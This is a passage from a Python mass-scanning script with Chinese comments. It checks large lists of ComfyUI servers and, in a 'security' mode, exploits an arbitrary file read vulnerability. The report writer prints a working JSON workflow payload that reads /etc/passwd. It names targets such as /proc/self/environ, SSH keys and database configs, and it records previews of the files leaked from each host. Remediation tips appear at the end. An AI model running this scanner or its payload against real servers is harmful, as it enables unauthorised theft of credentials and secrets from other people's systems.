        f.write("ComfyUI 的 `Load Text File` 节点可直接读取服务器本地文件，"
                "而 `PreviewAny` 节点会将结果以文本形式返回。两者组合即构成**任意文件读取**漏洞：\n\n")
        f.write("```json\n")
        f.write('{\n')
        f.write('  "1": {\n')
        f.write('    "class_type": "Load Text File",\n')
        f.write('    "inputs": {\n')
        f.write('      "file_path": "/etc/passwd",\n')
        f.write('      "dictionary_name": "sec_test"\n')
        f.write('    }\n')
        f.write('  },\n')
        f.write('  "2": {\n')
        f.write('    "class_type": "PreviewAny",\n')
        f.write('    "inputs": {"source": ["1", 0]}\n')
        f.write('  }\n')
        f.write('}\n')
        f.write("```\n\n")
        f.write("**影响范围**: 攻击者可在无认证情况下读取服务器任意文件，"
                "包括 `/etc/passwd`、`/proc/self/environ`、SSH 密钥、数据库配置等敏感信息。\n\n")

        f.write("---\n\n## 可利用节点详情\n\n")
        if not vuln_exploit:
            f.write("*本次检测未发现可利用节点*\n\n")
        else:
            for i, r in enumerate(vuln_exploit, 1):
                f.write(f"### {i}. `{r['host']}`\n\n")
                for lf in r.get("leaked_files", []):
                    f.write(f"**{lf['desc']}** (`{lf['path']}`)\n\n")
                    f.write(f"```\n{lf['content_preview']}\n```\n\n")
                f.write(f"<details><summary>检测详情</summary>\n\n")
                for d in r.get("details", []):
                    f.write(f"- {d}\n")
                f.write(f"\n</details>\n\n")

        # 仅安装了节点但未能利用的
        avail_only = [r for r in vuln_avail if not r.get("vuln_exploitable")]
        if avail_only:
            f.write("---\n\n## 有漏洞节点但未能利用\n\n")
            f.write("| # | 地址 | Load Text File | PreviewAny | 原因 |\n")
            f.write("|---|------|---------------|------------|------|\n")
            for i, r in enumerate(avail_only, 1):
                ltf = "✓" if r.get("load_text_file") else "✗"
                pa = "✓" if r.get("preview_any") else "✗"
                reason = r.get("details", [""])[0] if r.get("details") else r.get("skip_reason", "")
                f.write(f"| {i} | `{r['host']}` | {ltf} | {pa} | {reason} |\n")
            f.write("\n")

        f.write("---\n\n## 修复建议\n\n")
        f.write("1. **禁用 Load Text File 节点**: 在 `custom_nodes` 中移除或禁用该节点\n")
        f.write("2. **限制文件访问路径**: 修改节点代码，限制只能读取 `input/` 目录下的文件\n")
        f.write("3. **启用 API 认证**: 配置 ComfyUI 的 `--listen` 和认证中间件，禁止未授权访问\n")
        f.write("4. **网络隔离**: 将 ComfyUI 服务置于内网，不直接暴露到公网\n")
        f.write("5. **容器化部署**: 使用 Docker 运行，限制文件系统访问范围\n")

    return out_path


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("-f","--file", default=DEFAULT_CSV)
    ap.add_argument("-w","--workers", type=int, default=200)
    ap.add_argument("-t","--timeout", type=int, default=10)
    ap.add_argument("--detail-timeout", type=int, default=12)
    ap.add_argument("--security", action="store_true",
                    help="启用安全检测: 检测 Load Text File + PreviewAny 任意文件读取漏洞")
    ap.add_argument("--sec-workers", type=int, default=10,
                    help="安全检测并发数 (默认10)")
    ap.add_argument("--sec-read-timeout", type=int, default=10,
                    help="安全检测读取超时秒数 (默认10)")
    args = ap.parse_args()

    servers = load_servers(args.file)
    total = len(servers)
    print(f"{C_BOLD}ComfyUI 扫描 v3{C_RESET}  {args.file}  共{total}台  并发{args.workers}  超时{args.timeout}s\n")

    t0 = time.time()
    alive = []
    checked = [0]

    pool = ThreadPoolExecutor(max_workers=args.workers)
    futures = {pool.submit(check_and_detail, s, args.timeout, args.detail_timeout): i for i, s in enumerate(servers)}

    batches = (total + args.workers - 1) // args.workers
    total_timeout = max(args.timeout, args.detail_timeout) * batches + 60

    try:
        for fut in as_completed(futures, timeout=total_timeout):
            try:
                r = fut.result(timeout=1)
                if r["ok"]: alive.append(r)
            except: pass
            checked[0] += 1
            print(f"\r[测活+详情] {checked[0]}/{total}  存活 {C_GREEN}{len(alive)}{C_RESET}", end="", flush=True)
    except TimeoutError:
        pass
    pool.shutdown(wait=False, cancel_futures=True)
    print(f"\r[测活+详情] 完成  {checked[0]}/{total}  {C_GREEN}{len(alive)}{C_RESET} 存活  {C_RED}{total - len(alive)}{C_RESET} 异常     ")

    elapsed = time.time() - t0
    print_summary(alive, elapsed)

    md_out = write_output(alive)
    print(f"\n{C_GREEN}报告: {md_out}{C_RESET}")

    # 安全检测
    if args.security:
        sec_results = sec_scan(alive, workers=args.sec_workers,
                               timeout=args.timeout,
                               read_timeout=args.sec_read_timeout)
        sec_out = sec_write_report(sec_results, len(alive))
        print(f"{C_RED}安全报告: {sec_out}{C_RESET}")


if __name__ == "__main__":
    main()
